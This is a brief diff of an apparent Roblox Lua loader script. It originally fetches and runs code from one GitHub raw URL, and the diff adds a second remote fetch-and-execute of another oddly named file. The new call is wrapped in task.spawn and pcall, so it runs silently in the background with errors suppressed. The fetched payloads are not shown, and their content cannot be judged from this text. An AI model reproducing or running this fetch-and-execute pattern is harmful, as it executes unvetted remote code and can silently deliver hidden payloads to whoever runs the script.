@@ -1,1 +1,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/slivkineepin/Jdhdbsjshvd/refs/heads/main/fichsjsfnjgv"))()
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/slivkineepin/Jdhdbsjshvd/refs/heads/main/Sonlivewins"))()
+    end)
+end)
